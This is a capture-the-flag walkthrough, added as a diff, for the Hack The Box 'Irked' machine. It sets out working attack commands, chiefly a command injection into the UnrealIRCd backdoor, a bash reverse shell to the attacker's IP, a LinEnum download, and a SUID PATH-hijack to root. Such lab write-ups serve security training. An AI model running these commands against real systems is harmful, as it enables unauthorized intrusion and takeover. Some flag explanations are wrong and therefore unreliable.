@@ -1,0 +1,508 @@
+
+IRKED - 10.10.10.117
+
+IppSec Video Tutorial: https://www.youtube.com/watch?v=OGFTM_qvtVI&list=PLidcsTyj9JXJfpkDrttTdk1MNT6CDwVZF&index=3&t=0s
+
+***DISCLAIMER***
+
+I am not IppSEC nor do I work with him or for him. This write up is simply to be used as a learning tool only. Some people learn from videos and others from reading, and some both. Please forgive any typos. These write ups are to get you familiar with the types of tools used for penetration testing and how to utulize them.
+
+This write up is not verbatium, it is the steps taken to gain root, along with a few additional resources.
+
+For IppSec's videos please go to:
+https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
+
+# = Commented out or instructions.
+
+***Thank You***
+
+
+# First, let's run our nmap scan.
+
+nmap -sC -sV -oA nmap/help 10.10.10.117
+
+# After the scan has completed view the findings
+
+# Open Ports:
+
+22 - OpenSSH 6.7p1 Debian
+80 - Apache httpd 2.4.10
+111 - rpcbind 2-4
+
+# Browse to 10.10.10.117 and lets see what is on port 80
+# You get an image and a hint about RPC
+
+# Let's check out that RPC thing some more by running a deeper NMAP scan on it
+
+nmap -vvv- -p- 10.10.10.117
+
+# This will increase the verbosity on open ports.
+# Try the following on the webpage
+/robots.txt
+~root
+
+# Lets run gobuster on the website.
+# Gobuster is a tool for brute forcing URIs (Files and Directories) and DNS subdomains.
+# https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/
+
+gobuster -u http://10.10.10.117 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o root.log
+
+-u = username
+-w = wordlists
+-0 = output file
+
+# While gobustster is running try some different index formats on the page (e.g., index.php, index.html, index.aspx)
+
+# A /manual page was found. Browse to"
+
+10.10.10.117/manual
+
+# Just the Apache docs but the Copyright at the bottom reveal the date and version.
+
+# Port 8067 was revealed as open from the verbose NMAP scan, lets scan it.
+
+nmap -sC -sV -p 8067 10.10.10.117
+
+# Revealed as open and running UnrealIRCd
+
+# Lets run Netcat on that port
+
+ncat 10.10.10.117 8067
+
+# irked.htb Hostname is revealed, lets add the hostname to our hosts file on our box
+
+# nano or vi
+
+vi /etc/hosts
+
+127.0.0.1	localhost
+10.10.10.117	irked.htb
+
+# Save and Exit
+# Open firefox and browse to irked.htb to check for virtual hosts routing
+
+# Lets Google how to use IRC (RFC IRC) https://tools.ietf.org/html/rfc2812
+
+# Now lets use NetCat to talk to the IRC Server
+
+ncat 10.10.10.117 8067
+PASS ippsec
+NICK ippsec
+USER ipsec PleasSubscribe AndComment :ippsec
+
+# And now you are talking with the IRC Server
+# The version of the Unreal IRC server is given: Unreal3.2.8.1
+# Google a release date
+# Lets search for an exploit
+
+searchsploit unreal
+
+# A backdoor exploit is revealed using metasploit but lets learn how to do it without metasploit
+# Google unrealirc backdoor (https://lwn.net/Articles/392201/)
+
+# How the backdoor works
+
+# The backdoor was disguised to look like a debug statement in the code:
+
+    #ifdef DEBUGMODE3
+	   if (!memcmp(readbuf, DEBUGMODE3_INFO, 2))
+	       DEBUG3_LOG(readbuf);
+    #endif
+
+
+# Open a new terminal pane and run:
+
+tcpdump -i tun0 icmp
+
+# -i = capture from the desired interface
+
+# Open a new terminal pane and run:
+
+echo "AB; ping -c 1 YOU.RHO.ST.IP" | ncat 10.10.10.117 8067
+
+# After it times out it is revealed that the IRC Server initiates a session with your host, giving you command execution.
+# Now lets get a reverse shell
+
+ncat -lvnp 9001
+
+# Switch back to the other terminal pane and run:
+
+echo "AB; bash -c 'bash -i >& /dev/tcp/YOU.RHO.ST.IP/9001 0>&1'" | ncat 10.10.10.117 8067
+
+# Woot.. We got a shell, now lets upgrade the shell to a proper tty so we get tab autocomplete
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+ctrl + z
+
+stty raw -echo
+
+ncat -lvnp 9001
+
+# Now you are back at your shell
+
+export TERM=xterm
+
+pwd (Shows current working directory)
+
+ls -la
+
+cat .bash_history | less
+
+# The user djmardov is found
+
+exit
+
+cd /home/djmardov
+
+ls
+
+uname -a 
+# Will reveal when the kernel was compiled
+
+#What is in djmardov Documents folder?
+
+cd Documents/
+
+ls -la
+
+# Reveals a user.txt which we cant tead and a backup file
+
+cat .backup
+
+# We found a password (the Konami Code)
+# Super elite steg backup pw (steg = stegonagraphy and pw = password
+
+
+# Go back to the homepage
+
+http://10.10.10.117
+
+Right Click --> View Image and Copy the URL
+
+# Back to your host terminal
+
+curl http://10.10.10.117/irked.jpg -o irked.jpg
+
+# Copy that password we found and switch back to your host terminal
+
+apt install steghide
+# If it isn't already installed
+
+steghide --help
+# To see how to use the tool
+
+steghide extract -sf irked.jpg -p andpasthepassword
+
+# Wrote extraxted to pass.txt
+
+cat pass.txt
+
+# Copy the password 
+
+ssh djmardov@10.10.10.117
+# Paste the password and we get logged in.. coolbeans
+
+ls -la
+
+# View the output. We should be able to read the user.txt file in /Documets
+
+cd /Documents
+
+ls -la
+
+wx -c user.txt
+# MD5 sum revealed
+
+# Browse around to the other directories and see if you can find anything useful, if not lets run linEnum\
+# Open a new host terminal pane
+
+cd /opt/LinEnum
+
+python -m SimpleHTTPServer
+
+# Switch back to your shell and switch to a writeable directory
+
+cd /dev/shm
+
+wget YOU.RHO.ST.IP:8000/LinEnum.sh
+
+# Let it execute then run
+
+bash LinEnum.sh
+
+#IppSec found an interesting SUID file (/usr/bin/viewuser)
+
+ls -la /usr/bin/viewuser
+
+# Lets execute it
+
+viewuser
+
+# We get some info about the application is being developed. Lets copy it back over to our Kali box
+
+base64 -w0 /usr/bin/viewuser
+# -w0 = removes line wrapping
+
+# Copy the output
+# Switch back to the terminal on your host
+
+vi viewuser.b64
+# paste in the info
+
+base64 -d viewuser.b64 > viewuser
+# > = sends to a file
+
+chmod +x viewuser
+
+ltrace ./viewuser
+# Will show you the calls running
+
+# Copy the /tmp/listusers being executed by the system call
+# Switch back to the shell and edit the listusers file
+
+vi /tmp/listusers
+
+#!/bin/bash
+/bin/bash
+
+# Save and exit
+
+chmod +x /tmp/listusers
+#makes it executable
+
+/tmp/listusers
+
+# We get a bash shell
+exit
+
+vi /tmp/listusers
+
+#!/bin/bash
+echo "Sending a ROOT shell"
+/bin/bash
+
+viewuser
+# viewuser will execute what we did to get a shell
+# And woohoo.. we got ROOT!
+
+cd /root
+ls
+# View the output
+pass.txt and root.txt and cat them both to see what is in the file
+
+*** I am ending the write up here at 27min and 43s. If you would like to learn houw to use Ghidra please continue from that point. ***
+https://youtu.be/OGFTM_qvtVI?t=1663
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
